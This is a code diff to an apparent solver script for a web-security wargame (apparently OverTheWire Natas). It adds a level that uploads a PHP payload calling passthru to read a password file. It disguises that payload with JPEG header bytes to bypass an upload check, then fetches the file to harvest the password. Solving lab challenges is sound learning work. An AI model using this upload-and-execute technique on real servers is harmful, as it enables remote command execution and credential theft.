@@ -24,7 +24,7 @@ def rex(method, url, regexp, headers={}, body=""):
     print(" Request to web server: ", end="")
     res = req(method, url, headers, body)
     reg = None
-    data = res.read().decode()
+    data = res.read().decode(errors="ignore")
     if res.status == 200:
         print("OK")
         reg = re.search(regexp, data)
@@ -237,6 +237,45 @@ def level11():
     else:
         print(" Password not found")
 
+def level12():
+    print(" Upload PHP file")
+    d = "<b><? passthru(\"cat /etc/natas_webpass/natas{}\"); ?></b>".format(level + 1)
+    if level == 13:
+        # JPEG/EXIF markers
+        d = "\xff\xd8" + \
+            "\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x60\x00\x60\x00\x00" + \
+            d + \
+            "\xff\xd9"
+
+    # multipart/form-data body
+    b = "--BOUNDARY\r\n" + \
+        "Content-Disposition: form-data; name=\"filename\"\r\n\r\n" + \
+        "file.php\r\n" + \
+        "--BOUNDARY\r\n" + \
+        "Content-Disposition: form-data; name=\"uploadedfile\"; filename=\"file.php\"\r\n\r\n" + \
+        d +  "\r\n" + \
+        "--BOUNDARY\r\n"
+    
+    res, reg = rex(
+        "POST",
+        "/",
+        "The file <a href=\"upload/(\w+\.\w+)\">",
+        headers={"Content-Type": "multipart/form-data; boundary=BOUNDARY"},
+        body=b,
+    )
+
+    if res.status != 200: return
+    if reg:
+        f = "/upload/" + reg[1]
+        print(" Get page {}".format(f))
+        res, reg = rex("GET", f, "<b>(\w+)\n</b>")
+        if res.status != 200: return
+        if reg:
+            if len(passwords) == level + 1: passwords.append(reg[1])
+            print(" Password found: {}".format(passwords[level + 1]))
+        else:
+            print(" Password not found")        
+
 def levelN():
     print("Level {} not implemented yet".format(level))
     return
@@ -245,7 +284,7 @@ levels = [
     level0, level0, level2, level2,
     level4, level5, level6, level7,
     level8, level9, level9, level11,
-    levelN, levelN, levelN, levelN,
+    level12, level12, levelN, levelN,
     levelN, levelN, levelN, levelN,
     levelN, levelN, levelN, levelN,
     levelN, levelN, levelN, levelN,
